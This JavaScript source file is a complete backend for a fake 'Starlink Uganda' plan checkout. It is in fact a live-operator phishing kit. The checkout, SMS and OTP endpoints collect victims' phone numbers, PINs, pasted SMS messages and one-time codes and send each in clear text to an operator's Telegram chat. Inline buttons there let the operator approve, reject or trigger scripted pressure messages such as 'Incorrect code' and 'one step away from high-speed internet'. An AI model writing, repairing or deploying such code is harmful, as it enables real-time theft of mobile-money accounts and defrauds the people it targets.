/* ============================================================
   Starlink Uganda — Backend
   - Telegram approve/reject/resend/reminder via inline buttons
   - Pages: checkout → sms-paste → otp-verify
   - Polling status endpoint for user pages
   - In-memory Map, auto-cleaned
   ============================================================ */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

const app = express();

/* ============================================================
   CONFIG
   ============================================================ */
const PORT = process.env.PORT || 5000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const TELEGRAM_API         = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_ANSWER_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
const TELEGRAM_EDIT_URL    = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
const TELEGRAM_WEBHOOK_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;

const SESSION_TIMEOUT_MS = 10 * 60 * 1000; // 10 min

/* ============================================================
   IN-MEMORY SESSION STORE
   ============================================================ */
const sessions = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions.entries()) {
    if ((s.status === 'pending' || s.status === 'resend_requested')
        && now - s.createdAt > SESSION_TIMEOUT_MS) {
      s.status = 'timeout';
      s.resolvedAt = now;
    }
    if (now - s.createdAt > SESSION_TIMEOUT_MS * 2) {
      sessions.delete(id);
    }
  }
}, 60 * 1000);

/* ============================================================
   MIDDLEWARE
   ============================================================ */
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

/* Serve static HTML pages */
app.use(express.static(path.join(__dirname, 'public')));

/* ============================================================
   HELPERS
   ============================================================ */
function makeSessionId() {
  return crypto.randomBytes(16).toString('hex');
}

function escapeHtml(s = '') {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function isValidPhone(phone) {
  return typeof phone === 'string' && /^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''));
}

function stripFirstLine(text) {
  if (!text) return '';
  const idx = text.indexOf('\n');
  if (idx === -1) return '';
  const rest = text.slice(idx + 1);
  return rest.replace(/^━+\n/, '').trim();
}

/* ============================================================
   TELEGRAM HELPERS
   ============================================================ */
function buildKeyboard(step, sessionId) {
  const row = [];

  if (step === 'checkout') {
    row.push(
      { text: '✅ Approve', callback_data: `approve:checkout:${sessionId}` },
      { text: '❌ Reject',  callback_data: `reject:checkout:${sessionId}` }
    );
  }

  if (step === 'sms' || step === 'otp') {
    row.push(
      { text: '✅ Approve',  callback_data: `approve:${step}:${sessionId}` },
      { text: '❌ Reject',   callback_data: `reject:${step}:${sessionId}` },
      { text: '🔁 Resend',   callback_data: `resend:${step}:${sessionId}` },
      { text: '⏰ Reminder', callback_data: `reminder:${step}:${sessionId}` }
    );
  }

  return { inline_keyboard: [row] };
}

async function sendTelegramWithButtons(text, sessionId, step) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram env vars missing — message not sent.');
    return null;
  }
  try {
    const res = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: buildKeyboard(step, sessionId)
      })
    });
    const data = await res.json().catch(() => ({}));
    if (!data.ok) {
      console.warn('⚠️ Telegram error:', data.description || data);
      return null;
    }
    return data.result.message_id || null;
  } catch (err) {
    console.error('❌ Telegram fetch failed:', err.message);
    return null;
  }
}

async function editTelegramMessage(messageId, text, replyMarkup) {
  if (!messageId || !TELEGRAM_BOT_TOKEN) return;
  try {
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    };
    if (replyMarkup !== undefined) body.reply_markup = replyMarkup;

    await fetch(TELEGRAM_EDIT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (err) {
    console.error('editTelegramMessage failed:', err.message);
  }
}

async function answerCallback(callbackQueryId, text) {
  if (!callbackQueryId || !TELEGRAM_BOT_TOKEN) return;
  try {
    await fetch(TELEGRAM_ANSWER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
        show_alert: false
      })
    });
  } catch (err) {
    console.error('answerCallback failed:', err.message);
  }
}

/* ============================================================
   HEALTH CHECK
   ============================================================ */
app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'starlink-uganda-backend',
    activeSessions: sessions.size,
    webhook: global.__webhookStatus || 'unknown',
    time: new Date().toISOString()
  });
});

/* ============================================================
   POST /api/checkout
   ============================================================ */
app.post('/api/checkout', async (req, res) => {
  try {
    const { plan = '', data = '', price = 0, phone = '', pin = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof pin !== 'string' || pin.length < 4) {
      return res.status(400).json({ ok: false, error: 'Invalid PIN' });
    }

    const sessionId = makeSessionId();

    const text =
      `🛒 <b>Checkout — Awaiting Approval</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📦 <b>Plan:</b> ${escapeHtml(plan)} (${escapeHtml(data)})\n` +
      `💰 <b>Amount:</b> UGX ${Number(price).toLocaleString()}\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB')}\n\n` +
      `⏳ Tap ✅ or ❌ below`;

    const messageId = await sendTelegramWithButtons(text, sessionId, 'checkout');
    console.log(`[checkout] sessionId=${sessionId} msgId=${messageId}`);

    sessions.set(sessionId, {
      step: 'checkout',
      status: 'pending',
      data: { plan, data, price, phone, pin },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ ok: true, sessionId });
  } catch (err) {
    console.error('checkout error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/sms
   ============================================================ */
app.post('/api/sms', async (req, res) => {
  try {
    const { plan = '', data = '', price = 0, phone = '', sms = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof sms !== 'string' || sms.trim().length < 5) {
      return res.status(400).json({ ok: false, error: 'SMS text required' });
    }

    const sessionId = makeSessionId();

    const text =
      `📩 <b>Pasted SMS — Awaiting Approval</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📦 <b>Plan:</b> ${escapeHtml(plan)} (${escapeHtml(data)})\n` +
      `💰 <b>Amount:</b> UGX ${Number(price).toLocaleString()}\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB')}\n\n` +
      `📝 <b>Message:</b>\n<pre>${escapeHtml(sms)}</pre>\n` +
      `⏳ Tap ✅ / ❌ / 🔁 / ⏰ below`;

    const messageId = await sendTelegramWithButtons(text, sessionId, 'sms');
    console.log(`[sms] sessionId=${sessionId} msgId=${messageId}`);

    sessions.set(sessionId, {
      step: 'sms',
      status: 'pending',
      data: { plan, data, price, phone, sms },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ ok: true, sessionId });
  } catch (err) {
    console.error('sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/otp
   ============================================================ */
app.post('/api/otp', async (req, res) => {
  try {
    const { plan = '', data = '', price = 0, phone = '', otp = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof otp !== 'string' || !/^\d{4,8}$/.test(otp)) {
      return res.status(400).json({ ok: false, error: 'Invalid OTP' });
    }

    const sessionId = makeSessionId();

    const text =
      `🔢 <b>OTP Entered — Awaiting Approval</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📦 <b>Plan:</b> ${escapeHtml(plan)} (${escapeHtml(data)})\n` +
      `💰 <b>Amount:</b> UGX ${Number(price).toLocaleString()}\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔐 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB')}\n\n` +
      `⏳ Tap ✅ / ❌ / 🔁 / ⏰ below`;

    const messageId = await sendTelegramWithButtons(text, sessionId, 'otp');
    console.log(`[otp] sessionId=${sessionId} msgId=${messageId}`);

    sessions.set(sessionId, {
      step: 'otp',
      status: 'pending',
      data: { plan, data, price, phone, otp },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ ok: true, sessionId });
  } catch (err) {
    console.error('otp error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   GET /api/status/:sessionId
   ============================================================ */
app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.json({ ok: true, status: 'unknown', step: null });
  }

  if ((session.status === 'pending' || session.status === 'resend_requested')
      && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
    session.status = 'timeout';
    session.resolvedAt = Date.now();
  }

  return res.json({
    ok: true,
    status: session.status,
    step: session.step,
    message: session.userMessage || ''
  });
});

/* ============================================================
   POST /api/telegram-webhook
   ============================================================ */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cb = update.callback_query;

    if (!cb || !cb.data) return res.json({ ok: true });

    const [action, step, sessionId] = String(cb.data).split(':');
    const session = sessions.get(sessionId);

    console.log(`[webhook] action=${action} step=${step} sessionId=${sessionId} found=${!!session}`);

    if (!session) {
      await answerCallback(cb.id, 'Session expired');
      return res.json({ ok: true });
    }

    if (session.status === 'approved' || session.status === 'rejected' || session.status === 'timeout') {
      await answerCallback(cb.id, `Already ${session.status}`);
      return res.json({ ok: true });
    }

    const when = new Date().toLocaleString('en-GB');

    /* ----------------------------------------------------------
       🔁 RESEND
       ---------------------------------------------------------- */
    if (action === 'resend') {
      session.status = 'resend_requested';
      session.resendRequestedAt = Date.now();

      // Set user-facing message
      if (step === 'sms') {
        session.userMessage = 'You pasted the wrong SMS. Ensure your details match this order to complete the payment.';
      } else if (step === 'otp') {
        session.userMessage = 'Incorrect code. Please enter the correct OTP.';
      }

      await answerCallback(cb.id, '🔁 Resend requested');

      const preservedBody = stripFirstLine(session.originalText);
      const newText =
        `🔁 <b>RESEND REQUESTED</b> — awaiting final decision\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        preservedBody +
        `\n\n🕒 <b>Resend requested:</b> ${when}`;

      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, {
          inline_keyboard: [[
            { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
          ]]
        });
      }

      return res.json({ ok: true });
    }

    /* ----------------------------------------------------------
       ⏰ REMINDER
       ---------------------------------------------------------- */
    if (action === 'reminder') {
      session.status = 'reminder_sent';
      session.reminderSentAt = Date.now();

      if (step === 'sms') {
        session.userMessage = 'Kindly check your inbox and copy the message you have received, then paste it here. We are almost there — just one more step to unlock your Starlink connection!';
      } else if (step === 'otp') {
        session.userMessage = 'Almost done! Please enter the OTP code we sent you to unlock your Starlink plan. You are one step away from high-speed internet.';
      }

      await answerCallback(cb.id, '⏰ Reminder sent');

      const preservedBody = stripFirstLine(session.originalText);
      const newText =
        `⏰ <b>REMINDER SENT</b> — awaiting final decision\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        preservedBody +
        `\n\n🕒 <b>Reminder sent:</b> ${when}`;

      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, {
          inline_keyboard: [[
            { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` },
            { text: '🔁 Resend',  callback_data: `resend:${step}:${sessionId}` }
          ]]
        });
      }

      return res.json({ ok: true });
    }

    /* ----------------------------------------------------------
       ✅ APPROVE  /  ❌ REJECT
       ---------------------------------------------------------- */
    if (action === 'approve') {
      session.status = 'approved';
      session.resolvedAt = Date.now();
      await answerCallback(cb.id, '✅ Approved');
    } else if (action === 'reject') {
      session.status = 'rejected';
      session.resolvedAt = Date.now();

      if (step === 'checkout') {
        session.userMessage = 'Incorrect number. Kindly check your number and try again.';
      } else {
        session.userMessage = 'Rejected. Please try again.';
      }

      await answerCallback(cb.id, '❌ Rejected');
    } else {
      await answerCallback(cb.id, 'Unknown action');
      return res.json({ ok: true });
    }

    const statusLine = action === 'approve'
      ? '✅ <b>APPROVED</b>'
      : '❌ <b>REJECTED</b>';

    const preservedBody = stripFirstLine(session.originalText);
    const newText =
      `${statusLine}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      preservedBody +
      `\n\n🕒 <b>Resolved:</b> ${when}`;

    if (session.telegramMessageId) {
      await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('webhook error:', err);
    return res.json({ ok: true });
  }
});

/* ============================================================
   FALLBACK PAGE ROUTES
   ============================================================ */
const pageRoutes = {
  '/':            'index.html',
  '/dashboard/':  'index.html',
  '/plans/':      'plans.html',
  '/checkout/':   'checkout.html',
  '/sms-paste/':  'sms-paste.html',
  '/otp-verify/': 'otp-verify.html'
};

Object.entries(pageRoutes).forEach(([route, file]) => {
  app.get(route, (_req, res) => {
    res.sendFile(path.join(__dirname, 'public', file));
  });
});

/* ============================================================
   404 + ERROR
   ============================================================ */
app.use((_req, res) => {
  res.status(404).json({ ok: false, error: 'Not found' });
});

app.use((err, _req, res, _next) => {
  console.error('unhandled error:', err);
  res.status(500).json({ ok: false, error: 'Server error' });
});

/* ============================================================
   AUTO-REGISTER TELEGRAM WEBHOOK
   ============================================================ */
async function registerWebhook() {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('⚠️ Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
    global.__webhookStatus = 'missing_token';
    return;
  }

  let publicUrl = process.env.PUBLIC_URL || '';
  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
    publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
  }
  publicUrl = publicUrl.replace(/\/+$/, '');

  if (!publicUrl) {
    console.warn('⚠️ No PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
    global.__webhookStatus = 'missing_url';
    return;
  }

  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log('🔗 Registering webhook:', webhookUrl);

  try {
    const res = await fetch(TELEGRAM_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ['callback_query']
      })
    });
    const data = await res.json().catch(() => ({}));
    if (data.ok) {
      console.log('✅ Telegram webhook registered:', webhookUrl);
      global.__webhookStatus = 'ok';
    } else {
      console.warn('⚠️ Webhook registration failed:', data.description || data);
      global.__webhookStatus = `failed: ${data.description || 'unknown'}`;
    }
  } catch (err) {
    console.error('❌ Webhook registration error:', err.message);
    global.__webhookStatus = `error: ${err.message}`;
  }
}

/* ============================================================
   START
   ============================================================ */
app.listen(PORT, async () => {
  console.log('====================================');
  console.log('🛰️  Starlink Uganda — backend running');
  console.log(`🚀 Port: ${PORT}`);
  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
  console.log('====================================');

  setTimeout(registerWebhook, 2000);
});
